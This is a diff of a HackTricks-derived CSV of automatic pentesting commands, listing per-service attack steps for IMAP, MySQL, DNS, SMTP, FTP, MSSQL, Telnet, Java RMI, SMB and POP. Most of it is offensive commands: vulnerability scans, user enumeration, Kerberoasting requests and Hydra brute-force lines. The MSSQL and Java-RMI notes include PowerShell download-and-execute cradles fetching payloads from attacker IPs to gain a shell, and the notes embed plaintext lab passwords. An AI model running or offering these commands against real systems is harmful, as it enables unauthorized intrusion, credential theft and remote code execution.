@@ -1,0 +1,177 @@
+Diff between current HackTricks-Automatic-Commands/Main.csv and the newest csv
+            old_csv = 99 lines
+            new_csv = 57 lines
+            total   = -42 new lines
+            
+            7,12d6
+< IMAP,"143,993",Internet Message Access Protocol,Notes,Notes for WHOIS,"#As its name implies, IMAP allows you to access your email messages wherever you are; much of the time, it is accessed via the Internet. Basically, email messages are stored on servers. Whenever you check your inbox, your email client contacts the server to connect you with your messages. When you read an email message using IMAP, you aren't actually downloading or storing it on your computer; instead, you are reading it off of the server. As a result, it's possible to check your email from several different devices without missing a thing.
+< 
+< https://book.hacktricks.xyz/pentesting/pentesting-imap
+< ",Verified,1
+< IMAP,"143,993",Internet Message Access Protocol,Banner Grab,Banner Grab 143,nc -nv {IP} 143,Verified,2
+< IMAP,"143,993",Internet Message Access Protocol,Secure Banner Grab,Banner Grab 993,openssl s_client -connect {IP}:993 -quiet,Verified,3
+37,42d30
+< MySql,3306,MySql,Notes,Notes for MySql,"#MySQL is a freely available open source Relational Database Management System (RDBMS) that uses Structured Query Language (SQL).
+< 
+< https://book.hacktricks.xyz/pentesting/pentesting-mysql
+< ",Verified,1
+< MySql,3306,MySql,Nmap,Nmap with MySql Scripts,"nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse {IP} -p 3306",Verified,2
+< MySql,3306,MySql,MySql,Attempt to connect to mysql server,mysql -h {IP} -u {Username}@localhost,Verified,3
+56,101d43
+< DNS,53,Domain Name Service,Notes,Notes for DNS,"##These are the commands I run every time I see an open DNS port
+< 
+< dnsrecon -r 127.0.0.0/24 -n {IP} -d {Domain_Name}
+< dnsrecon -r 127.0.1.0/24 -n {IP} -d {Domain_Name}
+< dnsrecon -r {Network}{CIDR} -n {IP} -d {Domain_Name}
+< dig axfr @{IP}
+< dig axfr {Domain_Name} @{IP}
+< nslookup
+<     SERVER {IP}
+<     127.0.0.1
+<     {IP}
+<     Domain_Name
+<     exit
+< 
+< https://book.hacktricks.xyz/pentesting/pentesting-dns
+< ",Verified,1
+< DNS,53,Domain Name Service,Banner Grab,Grab DNS Banner,dig version.bind CHAOS TXT @DNS,Verified,2
+< DNS,53,Domain Name Service,Nmap Vuln Scan,Scan for Vulnerabilities with Nmap,"nmap -n --script ""(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport"" {IP}",Verified,3
+< DNS,53,Domain Name Service,Zone Transfer,Three attempts at forcing a zone transfer,dig axfr @{IP} && dix axfr @{IP} {Domain_Name} && fierce -dns {Domain_Name},Verified,4
+< DNS,53,Domain Name Service,Active Directory,Eunuerate a DC via DNS,"dig -t _gc._{Domain_Name} && dig -t _ldap._{Domain_Name} && dig -t _kerberos._{Domain_Name} && dig -t _kpasswd._{Domain_Name} && nmap --script dns-srv-enum --script-args ""dns-srv-enum.domain={Domain_Name}""",Verified,5
+< SMTP,"25,465,587",Simple Mail Transfer Protocol,Notes,Notes for SMTP,"#SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.
+< 
+< https://book.hacktricks.xyz/pentesting/pentesting-smtp
+< ",Verified,1
+< SMTP,"25,465,587",Simple Mail Transfer Protocol,Banner Grab,Grab SMTP Banner,nc -vn {IP} 25,Verified,2
+< SMTP,"25,465,587",Simple Mail Transfer Protocol,SMTP Vuln Scan,SMTP Vuln Scan With Nmap,"nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}",Verified,3
+< SMTP,"25,465,587",Simple Mail Transfer Protocol,SMTP User Enum,Enumerate uses with smtp-user-enum,smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP},Verified,4
+< SMTP,"25,465,587",Simple Mail Transfer Protocol,SMTPS Connect,Attempt to connect to SMTPS two different ways,openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587,Verified,5
+< SMTP,"25,465,587",Simple Mail Transfer Protocol,Find MX Servers,Find MX servers of an organization,dig +short mx {Domain_Name},Verified,6
+< SMTP,"25,465,587",Simple Mail Transfer Protocol,Hydra Brute Force,Need Nothing,hydra -P {Big_Passwordlist} {IP} smtp -V,Verified,7
+< FTP,21,File Transfer Protocol,Notes,Notes for FTP,"#Anonymous Login
+< -bi     <<< so that your put is done via binary
+< 
+< wget --mirror 'ftp://ftp_user:UTDRSCH53c""$6hys@10.10.10.59'
+< ^^to download all dirs and files
+< 
+< wget --no-passive-ftp --mirror 'ftp://anonymous:anonymous@10.10.10.98' 
+< if PASV transfer is disabled
+< 
+< https://book.hacktricks.xyz/pentesting/pentesting-ftp
+< ",Verified,1
+< FTP,21,File Transfer Protocol,Banner Grab,Grab FTP Banner via telnet,telnet -n {IP} 21,Verified,2
+< FTP,21,File Transfer Protocol,Cert Grab,Grab FTP Certificate if existing,openssl s_client -connect {IP}:21 -starttls ftp,Verified,3
+< FTP,21,File Transfer Protocol,nmap ftp,Anon login and bounce FTP checks are performed,nmap --script ftp-* -p 21 {IP},Verified,4
+< FTP,21,File Transfer Protocol,Browser Connection,Connect with Browser,#ftp://anonymous:anonymous@{IP},Verified,5
+< FTP,21,File Transfer Protocol,Hydra Brute Force,Need Username,hydra -t 1 -l {Username} -P {Big_Passwordlist} -vV {IP} ftp,Verified,6
+130,164d71
+< MSSQL,1433,Microsoft SQL Server,Notes,Notes for MSSQL,"#Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network (including the Internet).
+< 
+< #sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G
+< 
+< ###the goal is to get xp_cmdshell working###
+< 1. try and see if it works
+<     xp_cmdshell `whoami`
+<     go
+< 
+< 2. try to turn component back on
+<     EXEC SP_CONFIGURE 'xp_cmdshell' , 1
+<     reconfigure
+<     go
+<     xp_cmdshell `whoami`
+<     go
+< 
+< 3. 'advanced' turn it back on
+<     EXEC SP_CONFIGURE 'show advanced options', 1
+<     reconfigure
+<     go
+<     EXEC SP_CONFIGURE 'xp_cmdshell' , 1
+<     reconfigure
+<     go
+<     xp_cmdshell 'whoami'
+<     go
+< 
+< 
+< 
+< 
+< xp_cmdshell ""powershell.exe -exec bypass iex(new-object net.webclient).downloadstring('http://10.10.14.60:8000/ye443.ps1')""
+< 
+< 
+< https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
+< ",Verified,1
+< MSSQL,1433,Microsoft SQL Server,Nmap for SQL,Nmap with SQL Scripts,"nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {IP}",Verified,2
+190,216c97
+< Telnet,23,Telnet,Notes,Notes for t=Telnet,"#wireshark to hear creds being passed
+< tcp.port == 23 and ip.addr != myip
+< 
+< https://book.hacktricks.xyz/pentesting/pentesting-telnet
+< ",Verified,1
+< Telnet,23,Telnet,Banner Grab,Grab Telnet Banner,nc -vn {IP} 23,Verified,2
+< Telnet,23,Telnet,Nmap with scripts,Run nmap scripts for telnet,"nmap -n -sV -Pn --script ""*telnet*"" -p 23 {IP}",Verified,3
+< Java-RMI,1098,Java Remote Method Inclusion,Notes,Notes for Java-RMI,"#The Java Remote Method Invocation, or Java RMI, is a mechanism that allows an object that exists in one Java virtual machine to access and call methods that are contained in another Java virtual machine; This is basically the same thing as a remote procedure call, but in an object-oriented paradigm instead of a procedural one, which allows for communication between Java programs that are not in the same address space.
+< 
+< nmap -sC -sV -Pn 10.11.1.73 -p 1100 
+<     may dump the reg of the java-rmi instance. If this is the case the machine may be vulnerable to a deserializaion exploit.
+<     BaRMIe.jar is the way to go to directly exploit this vulnerability.
+<     https://github.com/NickstaDB/BaRMIe/releases/tag/v1.01      is where the latest build is hosted, pre-built
+< 
+< useage
+<     java -jar BaRMIe_v1.01.jar -attack 10.11.1.73 1100
+<     target select)          1
+<     available attacks)    1 (illegal bind deserialization)
+<     payloads)                1 (Apache Common Collections 3.1 worked for me, others may also work)
+<     OS Command)         powershell.exe -command ""IEX(new-object net.webclient).downloadstring('http://192.168.119.167:80/3232.ps1')""
+< 
+<     enjoy your system shell!
+< 
+< https://book.hacktricks.xyz/pentesting/1099-pentesting-java-rmi
+< ",Verified,1
+< Java-RMI,1098,Java Remote Method Inclusion,Nmap RMI,Nmap with RMI Scripts,"nmap -sV --script ""rmi-dumpregistry or rmi-vuln-classloader"" -p 1098 {IP}",Verified,2
+< Java-RMI,1098,Java Remote Method Inclusion,Nmap register,Dump register of java-rmi instance,nmap -sC -sV -Pn {IP} -p 1100,Verified,3
+---
+> Java RMI,"1090,1098,1099,1199,4443-4446,8999-9010,9999",Java Remote Method Invocation,Enumeration,Perform basic enumeration of an RMI service,rmg enum {IP} {PORT},Verified,1
+237,280d117
+< SMB,"137,138,139",Server Message Block,Notes,Notes for SMB,"#While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. SMB stands for ‘Server Message Blocks’. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.
+< 
+< #These are the commands I run in order every time I see an open SMB port
+< 
+< With No Creds
+< nbtscan {IP}
+< smbmap -H {IP}
+< smbmap -H {IP} -u null -p null
+< smbclient -N -L //{IP}
+< smbclient -N //{IP}/ --option=""client min protocol""=LANMAN1
+< rpcclient {IP}
+< rpcclient -U """" {IP}
+< crackmapexec smb {IP}
+< crackmapexec smb {IP} --pass-pol -u """" -p """"
+< GetADUsers.py -dc-ip {IP} ""{Domain_Name}/"" -all
+< GetNPUsers.py -dc-ip {IP} -request ""{Domain_Name}/"" -format hashcat
+< GetUserSPNs.py -dc-ip {IP} -request ""{Domain_Name}/""
+< getArch.py -target {IP}
+< 
+< With Creds
+< smbmap -H {IP} -u {Username} -p {Password}
+< smbclient -h ""\\\\{IP}\\\"" -U {Domain_Name} -W {Username} -l {IP}
+< smbclient -h ""\\\\{IP}\\\"" -U {Domain_Name} -W {Username} -l {IP} --pw-nt-hash `hash`
+< crackmapexec smb {IP} -u {Username} -p {Password} --shares
+< GetADUsers.py {Domain_Name}/{Username}:{Password} -all
+< GetNPUsers.py {Domain_Name}/{Username}:{Password} -request -format hashcat
+< GetUserSPNs.py {Domain_Name}/{Username}:{Password} -request
+< 
+< https://book.hacktricks.xyz/pentesting/pentesting-smb
+< ",Verified,1
+< SMB,"137,138,139",Server Message Block,Enum4Linux,General SMB Scan,enum4linux -a {IP},Verified,2
+< SMB,"137,138,139",Server Message Block,Nmap SMB Scan 1,SMB Vuln Scan With Nmap,"nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {IP}",Verified,3
+< SMB,"137,138,139",Server Message Block,Nmap Smb Scan 2,SMB Vuln Scan With Nmap (Less Specific),"nmap --script smb-vuln* -Pn -p 139,445 {IP}",Verified,4
+< SMB,"137,138,139",Server Message Block,Hydra Brute Force,Need User,hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} {IP} smb,Verified,5
+< POP,110,Post Office Protocol,Notes,Notes for POP,"#Post Office Protocol (POP) is a type of computer networking and Internet standard protocol that extracts and retrieves email from a remote mail server for access by the host machine. POP is an application layer protocol in the OSI model that provides end users the ability to fetch and receive email (from here).
+< The POP clients generally connect, retrieve all messages, store them on the client system, and delete them from the server. There are 3 versions of POP, but POP3 is the most used one.
+< 
+< https://book.hacktricks.xyz/pentesting/pentesting-whois
+< ",Verified,1
+< POP,110,Post Office Protocol,Banner Grab,Banner Grab 110,nc -nv {IP} 110,Verified,2
+< POP,110,Post Office Protocol,Banner Grab 995,Grab Banner Secure,openssl s_client -connect {IP}:995 -crlf -quiet,Verified,3
+< POP,110,Post Office Protocol,Nmap,Scan for POP info,"nmap --script ""pop3-capabilities or pop3-ntlm-info"" -sV -p 110 {IP}",Verified,4
+< POP,110,Post Office Protocol,Hydra Brute Force,Need User,hydra -l {Username} -P {Big_Passwordlist} -f {IP} pop3 -V,Verified,5
+< SSH,22,Secure Shell Hardening,Hydra Brute Force,Need Username,hydra -v -V -u -l {Username} -P {Big_Passwordlist} -t 1 -u {IP} ssh,Verified,1
